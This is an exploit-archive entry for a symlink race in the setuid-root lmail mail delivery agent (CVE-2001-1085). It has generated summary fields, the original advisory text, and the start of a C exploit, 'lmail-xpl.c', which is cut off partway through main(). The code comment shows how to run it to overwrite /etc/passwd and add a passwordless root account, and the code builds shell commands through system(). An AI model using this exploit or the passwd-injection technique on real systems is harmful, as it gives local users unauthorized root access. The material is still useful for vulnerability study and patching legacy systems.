// #<-- Publish Date --># // 2001-07-04 // #<-- Technical Document Summary (TDS) --># // The exploit leverages a race condition caused by insecure handling of temporary files and symbolic links within lmail. The program writes data from standard input directly to a temporary file without proper validation or isolation, allowing an attacker to manipulate symlink targets. This vulnerability permits arbitrary file overwrite on systems where the process runs with sufficient privileges. The affected component is the local mail delivery agent (lmail) binary, specifically its file creation and link management functions. Not specified in source. // #<-- Layman's Document Summary (LDS) --># // The weakness stems from a lack of proper security measures when creating temporary files and handling symbolic links, enabling an attacker to influence where data is written. This allows an attacker to overwrite arbitrary files on the system. The exploit does not demonstrate successful exploitation but shows how an attacker could manipulate file paths through crafted inputs. Not specified in source. // #<-- Key Words (KW) --># // lmail, TEMPFILE, BRUTE, symlink, temporary file, setuid root, CVE-2001-1085, OSVDB-1892 // #<-- Related Terms --># // race condition, symbolic link attack, setuid binary, local file race, privilege escalation, temporary file creation, data injection // #<-- Entities/Attributes --># // Software: lmail, TEMPFILE constant, BRUTE macro iteration count, pid variable, /tmp/lmail*, /bin/cp, /bin/touch, system call, perl -e, chown, root user // Platform: Linux // Date published: 2001-07-04 // Author: Charles Stevenson // Type: local // Not specified in source // #<-- Vulnerability Type --># // Not specified in source // #<-- Original Content --># // source: https://www.securityfocus.com/bid/2984/info Jon Zeeff's lmail is a local mail delivery agent (LDA) designed to provide mail-to-pipe and mail-to-file aliasing for smail. A race condition vulnerability exists in lmail. The lmail program makes insecure use of temporary files, making it susceptible to symbolic link attacks. The program also writes data from the standard input stream (stdin) directly to the temporary file. Because lmail is usually installed setuid root, it may be possible for a local user to overwrite any file on a system with arbitrary data. /* lmail-xpl.c * * Quick hack to exploit lmail * * Simply run it with the file you want to create/overwrite * and the data you wish to place in the file. * * Example: * * $ gcc -g -Wall lmail-xpl.c -o lmail-xpl * $ ./lmail-xpl /etc/passwd owned::0:0::/root:/bin/bash * * Then login as owned... etc.. * * by Charles Stevenson <core@ezlink.com> * * July 04 2001 * * shoutz b10z */ #include <stdio.h> #include <stdlib.h> #include <sys/types.h> #include <unistd.h> #define TEMPFILE "/tmp/ez.XXXXXX" #define BRUTE 128 void usage(char*); int main(int argc, char **argv){ char tempfile[128] = TEMPFILE; int fd, i; pid_t pid; char temp[512]; if (argc < 3){ usage(argv[0]); } if((fd = mkstemp(tempfile))==-1){ fprintf(stderr, "Error creating %s!
",tempfile); exit(1); } /* begin lazy slacker coding */ fprintf(stderr, "lmail-xpl.c by core (c) 2001
"); fprintf(stderr, "> backing up %s to %s
", argv[1], tempfile); /* backup old file */ sprintf(temp, "/bin/cp %s %s", argv[1], tempfile);

